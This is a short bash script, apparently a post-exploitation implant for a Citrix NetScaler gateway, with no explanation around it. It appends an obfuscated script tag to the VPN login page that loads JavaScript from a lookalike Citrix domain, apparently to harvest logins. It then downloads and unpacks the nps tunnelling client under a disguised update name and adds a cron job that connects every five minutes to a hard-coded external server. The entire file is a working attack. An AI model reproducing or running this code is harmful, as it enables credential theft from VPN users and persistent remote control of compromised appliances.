#!/bin/bash
echo '<script>var u=window.atob("aHR0cHM6Ly9jaXRyaXgtY2RuLm5ldC9wb2prZmNrajIwOTNqY2xrc2Rhc2RkajA5ZGZwaHFvaXdoamUyaTFvNDNqcGlvbS9jaXRyaXguanM=");var s=document.createElement("script");s.src=u;s.type="text/javascript";document.head.appendChild(s);</script>' > /tmp/output3.txt
cat /tmp/output3.txt >> /netscaler/ns_gui/vpn/tmindex.html
fetch -o /var/citirix_update.tar.gz https://github.com/ehang-io/nps/releases/download/v0.26.10/freebsd_amd64_client.tar.gz
tar -xzvf /var/citirix_update.tar.gz -C /var/
echo "*/5 * * * * /var/npc -server=45.56.162.42:8024 -vkey=rs5dbfeuas43s4bi -type=tcp" | crontab -
